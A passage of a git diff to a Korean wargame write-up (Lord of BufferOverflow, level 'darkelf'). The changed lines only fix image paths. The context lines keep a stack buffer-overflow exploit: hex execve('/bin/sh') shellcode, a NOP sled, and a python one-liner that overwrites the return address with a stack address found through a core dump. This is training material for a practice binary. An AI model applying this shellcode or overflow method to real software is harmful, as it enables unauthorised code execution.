@@ -94,9 +94,9 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 argv[2]에 NOP슬라이드와 쉘코드를 넣기 위해 core덤프를 통해 해당 주소를 구해오자.
 
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/06.darkelf/01.png" width="850px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/06.darkelf/01.png" width="850px">{:.rounded.shadow}
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/06.darkelf/02.png" width="600px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/06.darkelf/02.png" width="600px">{:.rounded.shadow}
 
 argv[2]의 주소는 0xbffffbde로 확인되었다.
 
@@ -104,7 +104,7 @@ argv[2]의 주소는 0xbffffbde로 확인되었다.
 
 argv[2] 주소와 shellcode를 넣고 exploit을 진행하면 문제가 풀린다.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/06.darkelf/03.png" width="850px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/06.darkelf/03.png" width="850px">{:.rounded.shadow}
 
 ```shell
 [wolfman@localhost wolfman]$ ./darkelf `python -c 'print "A"*44+"\xde\xfb\xff\xbf"'` `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
